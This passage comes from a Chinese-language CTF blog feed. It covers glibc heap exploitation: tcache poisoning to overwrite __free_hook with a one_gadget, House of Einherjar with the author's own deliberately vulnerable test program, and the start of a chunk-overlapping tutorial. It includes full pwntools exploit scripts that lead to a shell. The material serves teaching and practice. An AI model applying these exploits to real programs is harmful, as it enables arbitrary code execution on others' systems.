class="number">0x80</span>)</span><br><span class="line"></span><br><span class="line">delete(<span class="number">0</span>)</span><br><span class="line">show(<span class="number">0</span>)</span><br><span class="line">heap_addr = u64(io.recv(<span class="number">5</span>).ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>))&lt;&lt;<span class="number">12</span></span><br><span class="line">success(<span class="string">&quot;heap_addr :&quot;</span>+<span class="built_in">hex</span>(heap_addr))</span><br></pre></td></tr></table></figure><p>同时我们可以多申请一个chunk 利用这个chunk来泄露堆基址</p><p>紧接着填满tcache链表后再释放一个chunk进入unsortedbin 从而泄露libc基址</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">add(<span class="number">8</span>,<span class="number">0x10</span>)          <span class="comment">#防止unsortedbin合并</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>,<span class="number">8</span>):</span><br><span class="line">    delete(i)</span><br><span class="line"></span><br><span class="line">edit(<span class="number">7</span>,<span class="string">&#x27;\x11&#x27;</span>)</span><br><span class="line">show(<span class="number">7</span>)</span><br><span class="line">main_arena_addr = u64(io.recvuntil(<span class="string">&quot;\x7f&quot;</span>)[-<span class="number">6</span>:].ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>))-<span class="number">0x11</span></span><br><span class="line">success(<span class="string">&quot;main_arena_addr :&quot;</span>+<span class="built_in">hex</span>(main_arena_addr))</span><br><span class="line">libc_addr = main_arena_addr - (<span class="number">0x7fea010bfc00</span>-<span class="number">0x7fea00edc000</span>)</span><br><span class="line">success(<span class="string">&quot;libc_addr :&quot;</span>+<span class="built_in">hex</span>(libc_addr))</span><br><span class="line">free_hook = libc_addr + libc.sym[<span class="string">&#x27;__free_hook&#x27;</span>]</span><br><span class="line">onegadget_addr = libc_addr + <span class="number">0xdf54f</span></span><br></pre></td></tr></table></figure><p>这里之所以要修改chunk7的最后一个字节再打印出来 是因为该版本的main_arena_addr+96最后一个字节是00 如果直接泄露的话 显然是会被截断</p><p><a href="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/202303041215701.png" title="image-20230304121555666" class="gallery-item"><img src="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/202303041215701.png" alt="image-20230304121555666"></a></p><p>接下来的任务就很简单了 打free_hook</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">payload = (heap_addr&gt;&gt;<span class="number">12</span>)^(free_hook)</span><br><span class="line">edit(<span class="number">6</span>,p64(payload))</span><br><span class="line">add(<span class="number">9</span>,<span class="number">0x80</span>)</span><br><span class="line">add(<span class="number">10</span>,<span class="number">0x80</span>)</span><br><span class="line">edit(<span class="number">10</span>,p64(onegadget_addr))</span><br><span class="line">delete(<span class="number">0</span>)</span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure><p>完整exp:</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span>*</span><br><span class="line">io = process(<span class="string">&quot;./pwn&quot;</span>)</span><br><span class="line"><span class="comment">#io = remote(&quot;47.99.93.110&quot;,10001)</span></span><br><span class="line">context.log_level = <span class="string">&quot;debug&quot;</span></span><br><span class="line">libc = ELF(<span class="string">&quot;/home/chen/2.32-0ubuntu3.2_amd64/libc-2.32.so&quot;</span>)</span><br><span class="line">context.terminal = [<span class="string">&#x27;tmux&#x27;</span>,<span class="string">&#x27;splitw&#x27;</span>,<span class="string">&#x27;-h&#x27;</span>]</span><br><span class="line">elf = ELF(<span class="string">&quot;./pwn&quot;</span>)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">debug</span>():</span><br><span class="line">    gdb.attach(io)</span><br><span class="line">    pause()</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">add</span>(<span class="params">index,size</span>):</span><br><span class="line">    io.sendlineafter(<span class="string">&quot;5. Exit&quot;</span>,<span class="string">b&#x27;1&#x27;</span>)</span><br><span class="line">    io.sendlineafter(<span class="string">&quot;Index: &quot;</span>,<span class="built_in">str</span>(index))</span><br><span class="line">    io.sendlineafter(<span class="string">&quot;Size: &quot;</span>,<span class="built_in">str</span>(size))</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">delete</span>(<span class="params">index</span>):</span><br><span class="line">    io.sendlineafter(<span class="string">&quot;5. Exit&quot;</span>,<span class="string">b&#x27;2&#x27;</span>)</span><br><span class="line">    io.sendlineafter(<span class="string">&quot;Index: &quot;</span>,<span class="built_in">str</span>(index))</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">edit</span>(<span class="params">index,content</span>):</span><br><span class="line">    io.sendlineafter(<span class="string">&quot;5. Exit&quot;</span>,<span class="string">b&#x27;3&#x27;</span>)</span><br><span class="line">    io.sendlineafter(<span class="string">&quot;Index: &quot;</span>,<span class="built_in">str</span>(index))</span><br><span class="line">    io.sendafter(<span class="string">&quot;Content: &quot;</span>,content)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">show</span>(<span class="params">index</span>):</span><br><span class="line">    io.sendlineafter(<span class="string">&quot;5. Exit&quot;</span>,<span class="string">b&#x27;4&#x27;</span>)</span><br><span class="line">    io.sendlineafter(<span class="string">&quot;Index: &quot;</span>,<span class="built_in">str</span>(index))</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">8</span>):</span><br><span class="line">    add(i,<span class="number">0x80</span>)</span><br><span class="line"></span><br><span class="line">delete(<span class="number">0</span>)</span><br><span class="line">show(<span class="number">0</span>)</span><br><span class="line">heap_addr = u64(io.recv(<span class="number">5</span>).ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>))&lt;&lt;<span class="number">12</span></span><br><span class="line">success(<span class="string">&quot;heap_addr :&quot;</span>+<span class="built_in">hex</span>(heap_addr))</span><br><span class="line">add(<span class="number">8</span>,<span class="number">0x10</span>)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>,<span class="number">8</span>):</span><br><span class="line">    delete(i)</span><br><span class="line"></span><br><span class="line">edit(<span class="number">7</span>,<span class="string">&#x27;\x11&#x27;</span>)</span><br><span class="line">show(<span class="number">7</span>)</span><br><span class="line">main_arena_addr = u64(io.recvuntil(<span class="string">&quot;\x7f&quot;</span>)[-<span class="number">6</span>:].ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>))-<span class="number">0x11</span></span><br><span class="line">success(<span class="string">&quot;main_arena_addr :&quot;</span>+<span class="built_in">hex</span>(main_arena_addr))</span><br><span class="line">libc_addr = main_arena_addr - (<span class="number">0x7fea010bfc00</span>-<span class="number">0x7fea00edc000</span>)</span><br><span class="line">success(<span class="string">&quot;libc_addr :&quot;</span>+<span class="built_in">hex</span>(libc_addr))</span><br><span class="line">free_hook = libc_addr + libc.sym[<span class="string">&#x27;__free_hook&#x27;</span>]</span><br><span class="line">onegadget_addr = libc_addr + <span class="number">0xdf54f</span></span><br><span class="line"></span><br><span class="line">payload = (heap_addr&gt;&gt;<span class="number">12</span>)^(free_hook)</span><br><span class="line">edit(<span class="number">6</span>,p64(payload))</span><br><span class="line">add(<span class="number">9</span>,<span class="number">0x80</span>)</span><br><span class="line">add(<span class="number">10</span>,<span class="number">0x80</span>)</span><br><span class="line">edit(<span class="number">10</span>,p64(onegadget_addr))</span><br><span class="line">delete(<span class="number">0</span>)</span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure></div><script src="https://cdn.jsdelivr.net/lightgallery.js/1.0.1/js/lightgallery.min.js"></script><script>if (typeof lightGallery !== 'undefined') {        var options = {            selector: '.gallery-item'        };        lightGallery(document.getElementsByClassName('.article-gallery')[0], options);        }</script>]]></content>
      
      
      <categories>
          
          <category> heap </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>House Of Einherjar</title>
      <link href="/2023/03/02/House-Of-Einherjar/"/>
      <url>/2023/03/02/House-Of-Einherjar/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" type="text/css" href="https://cdn.jsdelivr.net/lightgallery.js/1.0.1/css/lightgallery.min.css" /><div class=".article-gallery"><p>基于chunk overlapping的一种利用手法 旨在申请到任意地址的chunk</p><h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>题目源码 各种漏洞都有 并且打印了堆基址 同时不打算开启pie 方便调试</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">//gcc -o testheap -no-pie testheap</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="type">int</span> chunk_time =<span class="number">0</span>;</span><br><span class="line"><span class="type">int</span> chunk_size[<span class="number">50</span>];</span><br><span class="line"><span class="type">char</span> *chunk_ptr[<span class="number">50</span>];</span><br><span class="line"><span class="type">char</span> magic_addr[<span class="number">1000</span>];</span><br><span class="line"><span class="type">void</span> <span class="title function_">bss_write</span><span class="params">()</span>&#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;For commissioning only&quot;</span>);</span><br><span class="line">    <span class="type">char</span> *a[<span class="number">50</span>];</span><br><span class="line">    read(<span class="number">0</span>,a,<span class="number">0x50</span>);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;Input content&quot;</span>);</span><br><span class="line">    read(<span class="number">0</span>,*a,<span class="number">0x100</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">void</span> <span class="title function_">gift</span><span class="params">()</span>&#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;Convenient debugging&quot;</span>);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;Please enter the got table of the function&quot;</span>);</span><br><span class="line">    <span class="type">char</span> a[<span class="number">0x20</span>];</span><br><span class="line">    read(<span class="number">0</span>,a,<span class="number">0x20</span>);</span><br><span class="line">    <span class="keyword">asm</span>(</span><br><span class="line">        <span class="string">&quot;pop %rsi\n\t&quot;</span></span><br><span class="line">        <span class="string">&quot;mov $1,%rax\n\t&quot;</span></span><br><span class="line">        <span class="string">&quot;mov $1,%rdi\n\t&quot;</span></span><br><span class="line">        <span class="string">&quot;mov $8,%rdx\n\t&quot;</span></span><br><span class="line">        <span class="string">&quot;syscall\n\t&quot;</span></span><br><span class="line">    );</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;Keep this gift&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">void</span> <span class="title function_">init</span><span class="params">()</span>&#123;</span><br><span class="line">    setvbuf(<span class="built_in">stdout</span>, <span class="number">0</span>, <span class="number">2</span>, <span class="number">0</span>);</span><br><span class="line">    setvbuf(<span class="built_in">stdin</span>, <span class="number">0</span>, <span class="number">2</span>, <span class="number">0</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">void</span> <span class="title function_">menu</span><span class="params">()</span>&#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;Life is fucking movie&quot;</span>);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;Life is always full of unhappiness, like this question&quot;</span>);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;Anyway, what&#x27;s your answer&quot;</span>);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;&gt;&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">void</span> <span class="title function_">add</span><span class="params">()</span>&#123;</span><br><span class="line">    <span class="type">int</span> index;</span><br><span class="line">    <span class="type">char</span> size[<span class="number">20</span>];</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;What do you really want?&quot;</span>);</span><br><span class="line">    <span class="keyword">if</span>(chunk_time&lt;=<span class="number">32</span>&amp;&amp;chunk_time&gt;=<span class="number">0</span>)&#123;</span><br><span class="line">        <span class="keyword">if</span>(!chunk_ptr[chunk_time])&#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;This is the %dth choice in your life\n&quot;</span>,chunk_time);</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;You can customize the size of chunk, but what about your life&quot;</span>);</span><br><span class="line">        read(<span class="number">0</span>,size,<span class="number">0x8</span>);</span><br><span class="line">        chunk_size[chunk_time] = atoi(size);</span><br><span class="line">        chunk_ptr[chunk_time] = <span class="built_in">malloc</span>(chunk_size[chunk_time]);</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;chunk_addr is %x\n&quot;</span>,&amp;(*chunk_ptr[chunk_time]));</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;Although your life is a piece of shit, you still have the initiative, right?&quot;</span>);</span><br><span class="line">        read(<span class="number">0</span>,chunk_ptr[chunk_time],chunk_size[chunk_time]);</span><br><span class="line">        chunk_time++;</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="built_in">puts</span>(<span class="string">&quot;error&quot;</span>);</span><br><span class="line">            <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">void</span> <span class="title function_">delete</span><span class="params">()</span>&#123;</span><br><span class="line">    <span class="type">char</span> data[<span class="number">100</span>];</span><br><span class="line">    <span class="type">int</span> index;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;I didn&#x27;t set the pointer to zero, just like some things can&#x27;t be repeated&quot;</span>);</span><br><span class="line">    <span class="built_in">scanf</span>(<span class="string">&quot;%d&quot;</span>,&amp;index);</span><br><span class="line">    <span class="built_in">free</span>(chunk_ptr[index]);</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">void</span> <span class="title function_">edit</span><span class="params">()</span>&#123;</span><br><span class="line">    <span class="type">int</span> index;</span><br><span class="line">    <span class="type">int</span> chunksize;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;It&#x27;s never too late to start again. What do you regret?&quot;</span>);</span><br><span class="line">    <span class="built_in">scanf</span>(<span class="string">&quot;%d&quot;</span>,&amp;index);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;You all know that there can be overflows here, so why do you set limits on your life?&quot;</span>);</span><br><span class="line">    <span class="built_in">scanf</span>(<span class="string">&quot;%d&quot;</span>,&amp;chunksize);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;Come back!&quot;</span>);</span><br><span class="line">    read(<span class="number">0</span>,chunk_ptr[index],chunksize);</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">void</span> <span class="title function_">show</span><span class="params">()</span>&#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;You can&#x27;t live a perfect life without making any effort&quot;</span>);</span><br><span class="line">    <span class="type">int</span> index;</span><br><span class="line">    <span class="built_in">scanf</span>(<span class="string">&quot;%d&quot;</span>,&amp;index);</span><br><span class="line">    <span class="built_in">puts</span>(chunk_ptr[index]);</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span>&#123;</span><br><span class="line">    <span class="type">int</span> choice;</span><br><span class="line">    init();</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;This program is used to debug heap vulnerabilities&quot;</span>);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;write by chen&quot;</span>);</span><br><span class="line">    <span class="keyword">while</span>(<span class="number">1</span>)&#123;</span><br><span class="line">        menu();</span><br><span class="line">        <span class="built_in">scanf</span>(<span class="string">&quot;%d&quot;</span>,&amp;choice);</span><br><span class="line">        <span class="keyword">switch</span>(choice)&#123;</span><br><span class="line">            <span class="keyword">case</span> <span class="number">1</span>:</span><br><span class="line">                add();</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            <span class="keyword">case</span> <span class="number">2</span>:</span><br><span class="line">                delete();</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            <span class="keyword">case</span> <span class="number">3</span>:</span><br><span class="line">                edit();</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            <span class="keyword">case</span> <span class="number">4</span>:</span><br><span class="line">                show();</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            <span class="keyword">case</span> <span class="number">5</span>:</span><br><span class="line">                gift();</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            <span class="keyword">case</span> <span class="number">6</span>:</span><br><span class="line">                bss_write();</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            <span class="keyword">case</span> <span class="number">7</span>:</span><br><span class="line">                <span class="built_in">puts</span>(<span class="string">&quot;The fog of that morning cleared, not only in the morning, but also in the fog&quot;</span>);</span><br><span class="line">                <span class="built_in">puts</span>(<span class="string">&quot;You will be stronger next time I see you&quot;</span>);</span><br><span class="line">                <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>在上一篇文章中 我们介绍了利用修改prev_size里实现合并的手法 基于这个漏洞 我们更进一步来利用</p><p>我们知道 如果topchunk相邻低地址处的chunk处于free状态 除开fastbin和tcachebin 那么top chunk就会将其合并 此时top chunk的首地址就会成为被合并的chunk的地址</p><p>这其实是house of force的内容 不过这里我们并不直接修改top chunk的prev_size </p><p>而是修改与top chunk物理相邻的chunk的prev_size</p><p>首先我们需要知道 当plmalloc在处理后向合并的时候 新的chunk的地址是根据当前chunk减去prev_size得到的</p><p>并且后向合并的前置条件是要通过两个检查</p><p><a href="https://pic.imgdb.cn/item/640011a5f144a010070f6f4b.png" class="gallery-item"><img src="https://pic.imgdb.cn/item/640011a5f144a010070f6f4b.png"></a></p><p>假设此时我们已经在某个地方伪造好了fake chunk 并且此时堆结构如图所示</p><p>为了实现chunkA后向合并到fake chunk 我们需要使得chunkA_addr - prev_size &#x3D; fakechunk_addr</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">chunk_at_offset(p, -((long) prevsize))</span><br></pre></td></tr></table></figure><p>同时还需要使得fake_chunk的size域和chunkA的prev_size域相同</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span> (__builtin_expect (chunksize(P) != prev_size (next_chunk(P)), <span class="number">0</span>)) \</span><br><span class="line">malloc_printerr (<span class="string">&quot;corrupted size vs. prev_size&quot;</span>);</span><br></pre></td></tr></table></figure><p>并且还要注意一下fake chunk的fd域和bk域 根据unlink的要求 我们需要使得fake chunk的fd域和bk域满足下面要求</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span> (__builtin_expect (FD-&gt;bk != P || BK-&gt;fd != P, <span class="number">0</span>)) \</span><br><span class="line">malloc_printerr (check_action, <span class="string">&quot;corrupted double-linked list&quot;</span>, P, AV);</span><br></pre></td></tr></table></figure><p>不过这个相对来说很好绕过 我们只需要让fd和bk域都为fake chunk的地址就行了 这样FD-&gt;bk 的值也还是fake chunk的地址 同理BK-&gt;fd也是</p><p>同时还需要使得chunkA的inuse位为0 这样plmalloc才会认为chunkA低地址处存在一个位于bin的chunk 并且是可以合并的</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span> (!prev_inuse(p)) &#123;</span><br><span class="line">prevsize = prev_size(p);</span><br><span class="line">size += prevsize;</span><br><span class="line">p = chunk_at_offset(p, -((<span class="type">long</span>) prevsize));</span><br><span class="line">unlink(av, p, bck, fwd);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>根据上述要求 我们想要实现house of einherjar需要拥有以下条件</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1.拥有堆溢出的能力 可以覆盖到next chunk的prev_size域和size域的最后一位</span><br><span class="line">2.拥有在目标地址构造fake chunk的能力</span><br><span class="line">3.拥有堆的基址来计算fake chunk和chunk的差值</span><br></pre></td></tr></table></figure><p>下面我们开始实际利用</p><h2 id="libc2-23"><a href="#libc2-23" class="headerlink" title="libc2.23"></a>libc2.23</h2><p>我们假设题目自带了打印堆基址的功能</p><p>并且可以在bss段中构造fake chunk的机会  实际利用情况里需要读者自己根据实际题目判断是否可行 以及如何实现</p><p>本题目由笔者本人编写 漏洞点显而易见 仅供参考</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">bss_addr = <span class="number">0x602320</span></span><br><span class="line">chunk0_addr = add(<span class="number">0x10</span>,<span class="string">b&#x27;aaaa&#x27;</span>)</span><br><span class="line">chunk0_addr = chunk0_addr * <span class="number">0x1000</span></span><br></pre></td></tr></table></figure><p>首先我们创建一个0x10大小的chunk 同时接收一下当前chunk的地址 也就是堆基址 这里之所以要乘以0x1000</p><p>是因为我出题的时候使用的是printf来输出 其遇到\x00就直接截断了 所以无法打印出堆基址后的三个0 这里需要自己补上</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">add(<span class="number">0x80</span>,<span class="string">b&#x27;aaaa&#x27;</span>)</span><br><span class="line">chunk1_addr = chunk0_addr + <span class="number">0x20</span></span><br><span class="line">prev_size = chunk1_addr-bss_addr</span><br><span class="line">payload = cyclic(<span class="number">0x10</span>)+p64(prev_size)+<span class="string">b&#x27;\x90&#x27;</span></span><br><span class="line">edit(<span class="number">0</span>,<span class="built_in">len</span>(payload),payload)</span><br></pre></td></tr></table></figure><p>随后我们再次申请一个chunk 这个chunk是用来实现本文漏洞的关键 最开始申请的chunk是用来堆溢出覆盖这个chunk的prev_size域和size域的inuse位</p><p>接着我们计算出chunk1_addr 和 prev_size应该要被设置成的值</p><p>接着利用chunk0的堆溢出漏洞覆盖chunk1的prev_size和inuse</p><p><a href="https://pic.imgdb.cn/item/64001ccff144a01007204056.png" class="gallery-item"><img src="https://pic.imgdb.cn/item/64001ccff144a01007204056.png"></a></p><p>此时堆的结构如图所示</p><p>接着在bss段上构造一个fake chunk 这里的函数是我为了方便演示特地写的 正常题目就别想了</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">payload = p64(<span class="number">0x90</span>)+p64(prev_size)+p64(bss_addr)*<span class="number">2</span></span><br><span class="line">bss_write(p64(bss_addr),payload)</span><br></pre></td></tr></table></figure><p>此时我们释放chunk1 看看其是否能过通过检查</p><p><a href="https://pic.imgdb.cn/item/64001dc7f144a01007217663.png" class="gallery-item"><img src="https://pic.imgdb.cn/item/64001dc7f144a01007217663.png"></a></p><p>为什么是top chunk跑到了fake chunk这边呢 同时addr还和我们fake chunk不一样</p><p>这是因为chunk1在和fake chunk合并之后 二者同样是一个物理相邻top chunk的堆块 所以top chunk就将其吞并</p><p>而这个addr是单纯的显示问题 我们试着申请一个chunk 看看写入的content位于哪里</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">add(0x20,b&#x27;gggggggg&#x27;)</span><br></pre></td></tr></table></figure><p><a href="https://pic.imgdb.cn/item/64001e92f144a010072261bf.png" class="gallery-item"><img src="https://pic.imgdb.cn/item/64001e92f144a010072261bf.png"></a></p><p>可以看到写入成功</p><p>接下来 难度升级 我们来试试如果题目没有给我们赠送堆基址 我们要如何自己获取堆基址并且实现漏洞的利用</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">bss_addr = <span class="number">0x602320</span></span><br><span class="line">add(<span class="number">0x10</span>,<span class="string">b&#x27;aaaa&#x27;</span>)</span><br><span class="line">add(<span class="number">0x10</span>,<span class="string">b&#x27;aaaa&#x27;</span>)</span><br><span class="line">delete(<span class="number">1</span>)</span><br><span class="line">delete(<span class="number">0</span>)</span><br><span class="line">show(<span class="number">0</span>)</span><br><span class="line">io.recv()</span><br><span class="line">heap_addr = u64(io.recv(<span class="number">4</span>).ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>))-<span class="number">0x20</span></span><br><span class="line">success(<span class="string">&quot;heap_addr :&quot;</span>+<span class="built_in">hex</span>(heap_addr))</span><br></pre></td></tr></table></figure><p>首先我们申请两个任意大小的chunk  目的是为了将两个chunk放入到fastbin中 利用UAF获取其fd域内的堆地址 经过计算得到堆基址</p><p><a href="https://pic.imgdb.cn/item/64002e20f144a010073cc403.png" class="gallery-item"><img src="https://pic.imgdb.cn/item/64002e20f144a010073cc403.png"></a></p><p>接着我们需要把这两个chunk从fastbin中取出来 否则等下unlink的时候就会报错 原因暂时不清楚</p><p><a href="https://pic.imgdb.cn/item/64002f02f144a010073e320f.png" class="gallery-item"><img src="https://pic.imgdb.cn/item/64002f02f144a010073e320f.png"></a></p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">add(<span class="number">0x10</span>,<span class="string">b&#x27;aaaa&#x27;</span>)<span class="comment">#2</span></span><br><span class="line">add(<span class="number">0x10</span>,<span class="string">b&#x27;aaaa&#x27;</span>)<span class="comment">#3</span></span><br><span class="line">add(<span class="number">0x80</span>,<span class="string">b&#x27;aaaa&#x27;</span>)<span class="comment">#4</span></span><br></pre></td></tr></table></figure><p>我们重新申请两个0x10大小的chunk 此时chunk2相当于chunk0 chunk3相当于chunk1</p><p>chunk4则是用来向后合并 利用漏洞的</p><p>接下来的手法就和之前的一致了</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">prev_size = heap_addr + <span class="number">0x40</span> - bss_addr</span><br><span class="line">payload = cyclic(<span class="number">0x10</span>)+p64(prev_size)+<span class="string">b&#x27;\x90&#x27;</span></span><br><span class="line">edit(<span class="number">3</span>,<span class="built_in">len</span>(payload),payload)</span><br><span class="line">payload = p64(<span class="number">0x100</span>)+p64(prev_size)+p64(bss_addr)*<span class="number">2</span></span><br><span class="line">bss_write(p64(bss_addr),payload)</span><br><span class="line">delete(<span class="number">4</span>)</span><br></pre></td></tr></table></figure></div><script src="https://cdn.jsdelivr.net/lightgallery.js/1.0.1/js/lightgallery.min.js"></script><script>if (typeof lightGallery !== 'undefined') {        var options = {            selector: '.gallery-item'        };        lightGallery(document.getElementsByClassName('.article-gallery')[0], options);        }</script>]]></content>
      
      
      <categories>
          
          <category> heap </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>chunk extend and overlapping</title>
      <link href="/2023/03/01/chunk-extend-and-overlapping/"/>
      <url>/2023/03/01/chunk-extend-and-overlapping/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" type="text/css" href="https://cdn.jsdelivr.net/lightgallery.js/1.0.1/css/lightgallery.min.css" /><div class=".article-gallery"><p>chunk extend的利用手法是基于plmalloc对于堆块的各种宏定义 其是通过计算chunk首地址和size大小来推断出上一个chunk或者是下一个chunk的地址</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">/* Ptr to next physical malloc_chunk. */</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> next_chunk(p) ((mchunkptr)(((char *) (p)) + chunksize(p)))</span></span><br></pre></td></tr></table></figure><p>获取下一个chunk的地址既是通过当前chunk地址加上当前chunk大小</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">/* Size of the chunk below P.  Only valid if prev_inuse (P).  */</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> prev_size(p) ((p)-&gt;mchunk_prev_size)</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/* Ptr to previous physical malloc_chunk.  Only valid if prev_inuse (P).  */</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> prev_chunk(p) ((mchunkptr)(((char *) (p)) - prev_size(p)))</span></span><br></pre></td></tr></table></figure><p>获取上一个chunk的地址则是通过当前chunk的地址减去前一个chunk的大小</p><p>也就是说 只要我们修改了chunk的size域和prev_size域 就可以使plmalloc误判chunk</p><h2 id="堆溢出覆盖下一个chunk的size域"><a href="#堆溢出覆盖下一个chunk的size域" class="headerlink" title="堆溢出覆盖下一个chunk的size域"></a>堆溢出覆盖下一个chunk的size域</h2><p>这个手法主要有两种适用的题型 一种是有伴随堆块的情况下 并且没有堆溢出 通过这种手法可以修改伴随堆块的内容</p><p>第二种是libc2.27的情况下 tcachebin的存在会使得我们打unsortedbin造成很大的影响 要么就是填满链表要么就是申请一个超过tcachebin大小的chunk并释放 有的题目会对这两种解决办法进行限制 这个时候就可以利用这种办法来合并chunk 从而获得一个超过tcachebin范围的堆块</p><p>下面来分别演示一下</p><h3 id="环境-ubuntu22-二进制文件依赖的libc2-27-目测2-23以上的版本都可以"><a href="#环境-ubuntu22-二进制文件依赖的libc2-27-目测2-23以上的版本都可以" class="headerlink" title="环境:ubuntu22 (二进制文件依赖的libc2.27) 目测2.23以上的版本都可以"></a>环境:ubuntu22 (二进制文件依赖的libc2.27) 目测2.23以上的版本都可以</h3><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">add(<span class="number">0x20</span>,<span class="string">b&#x27;aaaa&#x27;</span>)</span><br><span class="line">add(<span class="number">0x20</span>,<span class="string">b&#x27;aaaa&#x27;</span>)</span><br><span class="line">add(<span class="number">0x10</span>,<span class="string">b&#x27;aaaa&#x27;</span>)</span><br><span class="line">debug()</span><br></pre></td></tr></table></figure><p>首先申请三个堆块 chunk1用来堆溢出 覆盖chunk2的size域 chunk3用来和chunk2合并</p><p>唯一要注意的是覆盖size域的值 需要包括两个堆块的prev_size域和size域</p><p><a href="https://pic.imgdb.cn/item/63ff0c72f144a01007ba0762.png" class="gallery-item"><img 